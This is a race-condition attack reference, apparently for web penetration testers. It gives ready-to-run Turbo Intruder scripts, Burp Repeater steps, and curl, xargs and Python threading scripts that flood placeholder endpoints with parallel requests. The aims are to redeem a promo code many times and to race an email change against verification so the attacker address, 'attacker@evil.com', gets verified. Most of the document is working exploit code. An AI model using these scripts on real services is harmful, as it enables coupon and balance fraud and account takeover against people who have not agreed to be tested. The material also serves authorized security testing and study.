# Techniques Reference

## 1. Burp Repeater — Send Group in Parallel (Quickest Setup)

For most limit overrun attacks. Fast to set up, good for wide race windows.

### Setup

```
1. Capture the target request in Burp Proxy
2. Right-click → Add to group (or create new tab group)
3. Duplicate the request 10-20 times within the group
4. Right-click group tab → "Send group in parallel (separate connections)"
5. Observe responses — look for multiple successes
```

### Single Connection Mode (for HTTP/1.1 last-byte sync)

```
1. Set up group as above
2. Right-click group tab → "Send group in sequence (single connection)"
3. This sends all requests on same TCP connection — reduces timing variance
4. Better than separate connections for narrow race windows
```

### Adjust Thread Count

```
Start with 10 parallel requests
If no success → try 20, 30, 50
More threads = better chance of hitting race window
But: too many may cause server-side throttling → 429 responses
```

---

## 2. Single-Packet Attack (HTTP/2) — Most Reliable

The **single-packet attack** sends multiple complete HTTP/2 requests inside a single TCP packet. The server receives all requests simultaneously and processes them concurrently — eliminating network jitter entirely.

### When to Use

```
- Race window is narrow (< 1ms)
- HTTP/1.1 attacks work intermittently but not reliably
- Target supports HTTP/2 (check with: curl -I --http2 https://target.com)
```

### Turbo Intruder Setup — Single-Packet

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,    # ONE connection for single-packet
        engine=Engine.BURP2         # HTTP/2 engine
    )
    
    # Queue N identical attack requests, all with same gate
    for i in range(20):
        engine.queue(target.req, gate='race_gate')
    
    # Open gate = send all simultaneously in one packet burst
    engine.openGate('race_gate')

def handleResponse(req, interesting):
    table.add(req)
```

### Critical Burp Settings for Single-Packet

```
In Burp → Settings → Tools → Repeater:
  ☑ Update Content-Length → OFF (Turbo Intruder manages this)
  
In Turbo Intruder script:
  concurrentConnections=1  ← must be 1 for single-packet
  engine=Engine.BURP2      ← must be BURP2 for HTTP/2
```

### Verify HTTP/2 Support

```bash
curl -I --http2 https://target.com -v 2>&1 | grep -E "HTTP/2|ALPN"
# "HTTP/2 200" → single-packet attack viable
# "HTTP/1.1" only → use last-byte sync instead
```

---

## 3. Last-Byte Synchronization (HTTP/1.1)

When the target doesn't support HTTP/2, use last-byte sync to minimize timing differences.

### How It Works

```
Instead of sending complete requests in parallel:
1. Send all request HEADERS + BODY except the last byte
2. All requests are queued/buffered at server
3. Send final byte of all requests simultaneously → server processes all at once
```

### Turbo Intruder — Last-Byte Sync

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=1,
        pipeline=False,
        engine=Engine.HTTP1   # HTTP/1.1 mode
    )
    
    # Queue requests with last-byte held back (Turbo Intruder handles this)
    for i in range(20):
        engine.queue(target.req, gate='race_gate')
    
    engine.openGate('race_gate')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 4. Gated Multi-Endpoint Attack

For multi-endpoint races where two DIFFERENT requests must hit at the same time.

### Scenario

```
Target: email change + email verify racing simultaneously
Request A: POST /change-email {email: "new@attacker.com"}
Request B: POST /verify-email {token: "VERIFICATION_TOKEN"}

Goal: fire both at exactly the same time so:
- Email change replaces email → but old verification token is still valid
- Verification fires on NEW email with OLD token
```

### Turbo Intruder — Multi-Endpoint Gate

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=2,
        engine=Engine.BURP2
    )
    
    # Request A: email change
    changeEmailReq = '''POST /change-email HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/json
Content-Length: 34

{"email":"attacker@evil.com"}'''
    
    # Request B: email verification (token received to original email)
    verifyEmailReq = '''POST /verify-email HTTP/2
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: application/json
Content-Length: 32

{"token":"VERIFICATION_TOKEN"}'''
    
    # Queue both to same gate
    engine.queue(changeEmailReq, gate='race_gate')
    engine.queue(verifyEmailReq, gate='race_gate')
    
    # Connection warm-up
    engine.queue(target.req)
    import time
    time.sleep(1)
    
    # Fire both simultaneously
    engine.openGate('race_gate')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 5. Connection Warming Sequence

Always warm up before the real attack to eliminate cold-connection latency.

### Burp Repeater Group Warm-Up

```
1. Build your parallel group (e.g., 20x coupon redemption requests)
2. PREPEND a warm-up request at the start:
   GET / HTTP/1.1  (or any lightweight endpoint on same host)
3. Send entire group in SEQUENCE (single connection) once → warms connection
4. Switch to PARALLEL → fire the actual attack
```

### Turbo Intruder Warm-Up Pattern

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    
    # Warm-up: 1 request without gate (executes immediately)
    engine.queue(target.req)
    
    import time
    time.sleep(0.5)  # Wait for warm-up to complete
    
    # Now queue the real attack
    for _ in range(20):
        engine.queue(target.req, gate='attack')
    
    engine.openGate('attack')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 6. Pause-Based Desync Technique

For detecting race conditions in multi-step workflows where timing is asymmetric.

```python
# Send headers only, pause, then release body
# Useful for partial construction detection

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10
    )
    
    # Step 1: Send registration request (creates user in partial state)
    for _ in range(5):
        engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=200)
    
    # Step 2: During pause window, send exploit request
    engine.queue(exploitReq)

def handleResponse(req, interesting):
    table.add(req)
```

---

## 7. curl Parallel Attack (Quick Testing)

For rapid PoC without Burp. Great for confirming vulnerability exists before full exploit.

```bash
# Method 1: xargs parallel
seq 20 | xargs -P 20 -I{} curl -s \
  -X POST https://target.com/redeem \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"code":"PROMO20"}' \
  -w "%{http_code}\n" -o /dev/null

# Method 2: GNU parallel (better control)
parallel -j 20 \
  curl -s -X POST https://target.com/redeem \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"code":"PROMO20"}' ::: {1..20}

# Method 3: Python threading (most control)
python3 << 'EOF'
import threading, requests

TARGET = "https://target.com/redeem"
SESSION = "your_session_token"
THREADS = 20

def attack():
    r = requests.post(TARGET,
        headers={"Cookie": f"session={SESSION}", "Content-Type": "application/json"},
        json={"code": "PROMO20"})
    print(r.status_code, r.text[:100])

threads = [threading.Thread(target=attack) for _ in range(THREADS)]
[t.start() for t in threads]
[t.join() for t in threads]
EOF
```

---

## 8. Reading Results

| Response Pattern | Interpretation |
|---|---|
| All requests return 200 success | Race confirmed — all threads hit window |
| Mix of 200 success + 400/409 | Some threads won race — partial success, still exploitable |
| All return 200 but same effect only once | Timing too narrow or atomic DB transaction |
| First is 200, all others 429 | Rate limiting (not session locking) — try different tokens |
| Responses arrive in batches (not all at once) | Session locking likely — use different sessions |
| Unexpected response body (null fields, wrong user data) | Partial construction or state confusion — dig deeper |
